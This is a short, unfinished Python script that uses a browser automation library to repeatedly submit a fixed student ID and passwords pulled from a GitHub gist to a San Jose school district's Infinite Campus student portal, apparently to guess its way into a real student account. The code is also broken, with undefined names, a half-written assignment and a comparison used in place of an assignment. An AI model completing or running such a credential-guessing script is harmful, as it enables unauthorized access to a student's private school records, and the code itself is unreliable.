from webbot import Browser
import requests

web = Browser()
web.go_to("https://sanjoseca.infinitecampus.org/campus/portal/students/sanjose.jsp")
loggedIn = False
gistLink = "https://gist.githubusercontent.com/DominusCube/79c6ffd3e861e6af983ff58e71f31980/raw/636d4c714cd6c1ef827742bda9dfd51f18286551/Final"

while loggedIn == False:
  passwords = functions.readGist(gistLink)
  web.type("s213613")
  web.press(web.Key.ENTER)
  web.type(password)
  web.press(web.Key.ENTER)
  if web.get_current_url() == "https://sanjoseca.infinitecampus.org/campus/nav-wrapper/student/portal/student/today":
    print("Login succesful!")
    correctPassword = 
    loggedIn == True
    
  

